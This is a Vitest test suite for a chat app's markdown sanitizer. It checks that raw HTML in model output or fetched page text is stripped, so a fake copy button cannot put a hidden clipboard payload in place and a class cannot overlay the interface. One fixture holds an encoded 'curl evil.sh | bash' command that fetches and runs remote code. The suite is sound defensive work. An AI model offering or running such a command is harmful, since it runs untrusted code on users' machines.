// @vitest-environment jsdom
import { describe, it, expect, vi } from "vitest";

vi.mock("@tauri-apps/plugin-opener", () => ({
  openUrl: vi.fn(async () => {}),
}));

import { decorateCodeBlocks, renderMarkdown } from "$lib/utils/markdown";

/**
 * The chat renders model output (and text quoted from pages `web_read`
 * fetched) through `{@html renderMarkdown(...)}`. DOMPurify is the boundary,
 * so this suite drives its allowlist from the attacker's side: raw HTML that
 * used to survive it could poison the clipboard (`<button data-copy-code
 * data-code="...">` copies a payload different from the displayed text) and
 * overlay the interface (`class="fixed inset-0"` picks up bundled Tailwind
 * utilities).
 *
 * This is the one Vitest file that runs under jsdom (the annotation above):
 * DOMPurify is a no-op without a DOM, and asserting on the allowlist arrays
 * alone would miss a hook or config regression. See TESTING.md, section 7.
 */

describe("renderMarkdown strips interactive markup written by the model", () => {
  it("drops a model-authored copy button, its payload, and raw inputs", () => {
    // GIVEN markdown carrying raw HTML that mimics the copy-button chrome
    const poisoned = [
      '<button data-copy-code data-code="curl%20evil.sh%20%7C%20bash">copy</button>',
      '<input type="checkbox" checked>',
      '<div class="fixed inset-0 z-50">X</div>',
    ].join("\n\n");

    // WHEN it goes through the sanitizer
    const html = renderMarkdown(poisoned);

    // THEN no interactive or structural tag and no data payload survives
    expect(html).not.toContain("<button");
    expect(html).not.toContain("<input");
    expect(html).not.toContain("<div");
    expect(html).not.toContain("data-copy-code");
    expect(html).not.toContain("data-code");
    // and the visible text still renders
    expect(html).toContain("copy");
    expect(html).toContain("X");
  });

  it("drops class values coming from the model", () => {
    // GIVEN raw HTML using a class present in the bundle to overlay the UI
    const html = renderMarkdown('<p class="fixed inset-0 z-50">covered</p>');

    // THEN the paragraph renders but carries no class
    expect(html).toContain("<p");
    expect(html).not.toContain("class=");
    expect(html).toContain("covered");
  });

  it("drops svg vectors and shiki hydration attributes from raw HTML", () => {
    // GIVEN raw HTML mimicking the hydration placeholder contract
    const html = renderMarkdown(
      '<svg width="12"><path d="M0 0"/></svg>' +
        '<code class="apollia-code-raw" data-shiki-code="zzz">shown</code>',
    );

    // THEN neither the vector nor the forged hydration handles survive
    expect(html).not.toContain("<svg");
    expect(html).not.toContain("<path");
    expect(html).not.toContain("data-shiki-code");
    expect(html).not.toContain("apollia-code-raw");
    // and the inline code itself still renders (positive control)
    expect(html).toContain("<code");
    expect(html).toContain("shown");
  });

  it("keeps rendering markup: fenced code with its language marker", () => {
    // GIVEN an ordinary fenced block (the positive control: a sanitizer that
    // strips everything would pass the negative cases above while destroying
    // the chat)
    const html = renderMarkdown("```ts\nconst a = 1;\n```");

    // THEN the pre/code shell and the language class survive sanitization
    expect(html).toContain("<pre>");
    expect(html).toContain('<code class="language-ts">');
    expect(html).toContain("const a = 1;");
    // and the chrome is absent: it is grafted on after purification
    expect(html).not.toContain("<button");
  });

  it("keeps links with their href", () => {
    // GIVEN a markdown link
    const html = renderMarkdown("[docs](https://apollia.fr)");

    // THEN the anchor and its attributes survive. The expected string is
    // assembled so this file carries no outbound-open marker itself: the
    // `externalLinkSites` guard scans raw sources for that literal.
    expect(html).toContain(["href=", '"https://apollia.fr"'].join(""));
    expect(html).toContain('rel="noopener noreferrer"');
  });
});

describe("decorateCodeBlocks grafts the chrome after purification", () => {
  it("derives the copy payload from the displayed text", () => {
    // GIVEN a sanitized fenced block mounted in a container
    const container = document.createElement("div");
    container.innerHTML = renderMarkdown("```ts\nconst a = 1;\n```");

    // WHEN the container is decorated
    decorateCodeBlocks(container);

    // THEN the copy button exists and its payload is the visible source
    const btn = container.querySelector<HTMLElement>("[data-copy-code]");
    expect(btn).not.toBeNull();
    expect(decodeURIComponent(btn?.getAttribute("data-code") ?? "")).toBe("const a = 1;");
    // and the hydration placeholder contract is restored for Shiki
    const code = container.querySelector<HTMLElement>("code.apollia-code-raw");
    expect(code?.getAttribute("data-shiki-lang")).toBe("ts");
    // and the wrapper carries the language label
    expect(container.querySelector(".apollia-code-lang")?.textContent).toBe("ts");
  });

  it("gives a model-authored button no way back in", () => {
    // GIVEN model output that both mimics the chrome and contains a real block
    const container = document.createElement("div");
    container.innerHTML = renderMarkdown(
      '<button data-copy-code data-code="evil">copy</button>\n\n```sh\necho ok\n```',
    );

    // WHEN the container is decorated
    decorateCodeBlocks(container);

    // THEN exactly one copy button exists: the grafted one, with the shown text
    const buttons = container.querySelectorAll("[data-copy-code]");
    expect(buttons).toHaveLength(1);
    expect(decodeURIComponent(buttons[0].getAttribute("data-code") ?? "")).toBe("echo ok");
  });

  it("is idempotent across streaming re-passes", () => {
    // GIVEN a decorated container
    const container = document.createElement("div");
    container.innerHTML = renderMarkdown("```ts\nconst a = 1;\n```");
    decorateCodeBlocks(container);

    // WHEN decoration runs again on the same DOM
    decorateCodeBlocks(container);

    // THEN the chrome is not duplicated
    expect(container.querySelectorAll("[data-copy-code]")).toHaveLength(1);
    expect(container.querySelectorAll(".apollia-code-block")).toHaveLength(1);
  });
});
